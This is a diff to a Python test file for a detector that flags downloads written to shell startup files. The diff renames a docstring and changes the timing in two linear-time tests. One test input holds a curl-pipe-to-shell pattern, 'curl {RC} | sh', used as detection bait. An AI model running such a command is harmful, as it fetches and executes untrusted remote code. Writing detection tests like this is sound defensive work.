@@ -1,4 +1,4 @@
-"""B-2217: a download written to a shell startup file is found whatever the spelling of the target.
+"""A download written to a shell startup file is found whatever the spelling of the target.
 Mirrors packages/zn-gate/test/destructive_targets.test.js. Only fake example.com URLs and example paths; nothing is run."""
 import time
 
@@ -79,12 +79,12 @@ def test_cd_in_a_pipeline_does_not_move_the_folder():
 ])
 def test_200kb_stays_linear(unit):
     big = unit * ((200 * 1024 - 8) // len(unit))
-    t0 = time.perf_counter()
+    t0 = time.process_time()
     rule(big)
-    assert time.perf_counter() - t0 < 3.0
+    assert time.process_time() - t0 < 3.0
 
 
 def test_many_redirects_stay_linear():
-    t0 = time.perf_counter()
+    t0 = time.process_time()
     rule(">x " * 60000 + f"curl {RC} | sh")
-    assert time.perf_counter() - t0 < 3.0
+    assert time.process_time() - t0 < 3.0
